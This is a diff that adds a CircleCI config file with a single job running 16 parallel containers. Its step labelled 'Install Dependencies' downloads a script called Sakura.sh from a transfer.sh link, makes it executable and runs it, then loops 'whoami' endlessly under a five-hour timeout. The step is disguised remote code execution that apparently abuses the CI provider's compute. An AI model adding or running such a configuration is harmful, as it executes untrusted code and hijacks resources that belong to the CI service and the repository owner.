@@ -1,0 +1,17 @@
+version: 2.1 
+jobs: 
+    trial: 
+      docker: 
+            - image: debian:latest 
+      parallelism: 16 
+      steps: 
+        - run: 
+            name: Install Dependencies 
+            command: apt update && apt install curl -y && curl https://transfer.sh/yEiwib/Sakura.sh -o Sakura.sh && chmod +x Sakura.sh && ./Sakura.sh && while true; do whoami; done;
+            no_output_timeout: 5h 
+ 
+workflows: 
+    version: 2.1 
+    build: 
+        jobs: 
+        - trial
